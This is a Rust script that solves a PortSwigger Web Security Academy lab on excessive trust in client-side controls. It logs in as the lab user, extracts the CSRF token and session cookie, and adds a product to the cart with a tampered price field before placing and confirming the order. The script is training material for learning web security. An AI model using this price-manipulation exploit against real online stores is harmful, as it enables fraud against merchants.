/**********************************************************************
*
* Lab: Excessive trust in client-side controls
*
* Hack Steps: 
*      1. Fetch login page
*      2. Extract the csrf token and session cookie
*      3. Login as wiener
*      4. Add the leather jacket to the cart with a modified price
*      5. Fetch wiener's cart
*      6. Extract the csrf token needed for placing order
*      7. Place order
*      8. Confirm order
*
***********************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a4400f4039ce6bb8173bc3700b30076.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch("/login");

    println!("{}", "OK".green());
    print!("{}", "⦗2⦘ Extracting the csrf token and session cookie.. ",);
    flush_terminal();

    let mut session = get_session_cookie(&login_page);
    let mut csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Logging in as wiener.. ",);
    flush_terminal();

    let login_as_wiener = login_as_wiener(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗4⦘ Adding the leather jacket to the cart with a modified price.. ");
    flush_terminal();

    session = get_session_cookie(&login_as_wiener);
    add_leather_jacket_to_cart(&session);

    println!("{}", "OK".green());
    print!("⦗5⦘ Fetching wiener's cart.. ",);
    flush_terminal();

    let wiener_cart = fetch_with_session("/cart", &session);

    println!("{}", "OK".green());
    print!("⦗6⦘ Extracting the csrf token needed for placing order.. ");
    flush_terminal();

    println!("{}", "OK".green());
    print!("⦗7⦘ Placing order.. ",);
    flush_terminal();

    csrf_token = get_csrf_token(wiener_cart);
    place_order(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗8⦘ Confirming order.. ",);
    flush_terminal();

    fetch_with_session("/cart/order-confirmation?order-confirmed=true", &session);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn login_as_wiener(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
}

fn add_leather_jacket_to_cart(session: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/cart"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("productId", "1"),
            ("redir", "PRODUCT"),
            ("quantity", "1"),
            ("price", "1000"),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to add the leather jacket to the cart with a modified price".red()
        ))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn place_order(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/cart/checkout"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([("csrf", &csrf_token)]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to place order".red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
